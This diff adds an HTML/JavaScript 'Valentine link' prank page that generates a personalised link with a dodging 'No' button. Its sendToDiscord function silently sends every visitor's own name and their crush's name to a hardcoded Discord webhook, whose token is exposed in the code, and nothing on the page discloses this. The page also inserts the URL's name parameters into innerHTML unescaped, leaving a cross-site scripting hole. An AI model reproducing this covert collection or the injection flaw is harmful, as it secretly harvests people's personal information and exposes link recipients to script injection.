@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Valentine Link Prank ❤️</title>
+
+<style>
+body {
+    background: linear-gradient(135deg, #ff4e8a, #ff9eb5);
+    font-family: Arial, sans-serif;
+    text-align: center;
+    height: 100vh;
+    margin: 0;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+}
+
+.container {
+    background: white;
+    padding: 40px;
+    border-radius: 20px;
+    box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+    width: 350px;
+    position: relative;
+}
+
+h1 {
+    color: #ff2e63;
+}
+
+input {
+    width: 90%;
+    padding: 12px;
+    margin: 10px 0;
+    border-radius: 10px;
+    border: 1px solid #ccc;
+    font-size: 16px;
+}
+
+button {
+    padding: 12px 25px;
+    margin: 15px;
+    font-size: 16px;
+    border: none;
+    border-radius: 25px;
+    cursor: pointer;
+}
+
+#yesBtn {
+    background: #ff2e63;
+    color: white;
+}
+
+#noBtn {
+    background: #444;
+    color: white;
+    position: absolute;
+}
+
+.linkBox {
+    font-size: 14px;
+    word-wrap: break-word;
+    margin-top: 15px;
+    color: #333;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container" id="creatorPage">
+    <h1>Create Your Valentine Link ❤️</h1>
+    <input type="text" id="yourName" placeholder="Your Name" />
+    <input type="text" id="crushName" placeholder="Crush's Name" />
+    <button onclick="generateLink()">Generate Link 💘</button>
+    <div class="linkBox" id="generatedLink"></div>
+</div>
+
+<div class="container" id="valentinePage" style="display:none;">
+    <h1 id="question"></h1>
+    <button id="yesBtn">Yes 💖</button>
+    <button id="noBtn">No 😢</button>
+    <div id="message" style="margin-top:20px; font-size:20px; color:#ff2e63;"></div>
+</div>
+
+<script>
+const params = new URLSearchParams(window.location.search);
+const from = params.get("from");
+const to = params.get("to");
+
+if (from && to) {
+    document.getElementById("creatorPage").style.display = "none";
+    document.getElementById("valentinePage").style.display = "block";
+
+    document.getElementById("question").innerHTML =
+        to + ", will you be " + from + "'s Valentine? ❤️";
+}
+
+function generateLink() {
+    const yourName = document.getElementById("yourName").value;
+    const crushName = document.getElementById("crushName").value;
+
+    if (!yourName || !crushName) {
+        alert("Enter both names!");
+        return;
+    }
+
+    const baseUrl = window.location.origin + window.location.pathname;
+    const customLink = baseUrl + "?from=" + 
+        encodeURIComponent(yourName) + 
+        "&to=" + encodeURIComponent(crushName);
+
+    const linkBox = document.getElementById("generatedLink");
+    linkBox.innerHTML = `
+        Copy this link and send to your crush 💌<br><br>
+        <b>${customLink}</b>
+        <br><br>
+        <button onclick="copyLink('${customLink}')">Copy Link 📋</button>
+    `;
+
+    // Send data to Discord webhook with embed
+    sendToDiscord(yourName, crushName);
+}
+
+function copyLink(link) {
+    navigator.clipboard.writeText(link);
+    alert("Link copied! Send it 😏");
+}
+
+// Function to send data to Discord webhook with embed and custom username
+function sendToDiscord(fromName, toName) {
+    fetch('https://discord.com/api/webhooks/1472034581158039675/ICNt4x6toCXmT7I4lWLY0EkWZFFwPFmiKwb4_zmwcVn7AD0072XoDMR1d00c2y5To_iK', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+            username: "CRUSH BOT",
+            embeds: [
+                {
+                    title: "New Valentine Link Created!",
+                    description: `**From:** ${fromName}\n**To:** ${toName}`,
+                    color: 3447003 // Blue color in decimal
+                }
+            ]
+        }),
+    })
+    .then(res => {
+        if (res.ok) {
+            console.log("Embed sent to Discord successfully!");
+        } else {
+            console.error("Failed to send embed to Discord. Status:", res.status);
+        }
+    })
+    .catch(error => {
+        console.error('Error:', error);
+    });
+}
+
+const noBtn = document.getElementById("noBtn");
+const yesBtn = document.getElementById("yesBtn");
+const message = document.getElementById("message");
+
+noBtn.addEventListener("mouseover", function() {
+    const x = Math.random() * (window.innerWidth - 120);
+    const y = Math.random() * (window.innerHeight - 120);
+    noBtn.style.position = "absolute"; // ensure position is absolute
+    noBtn.style.left = x + "px";
+    noBtn.style.top = y + "px";
+});
+
+yesBtn.addEventListener("click", function() {
+    message.innerHTML = "YAYYY 💕 You said YES!!! 💘";
+    document.body.style.background = "#ff2e63";
+});
+</script>
+
+</body>
+</html>in
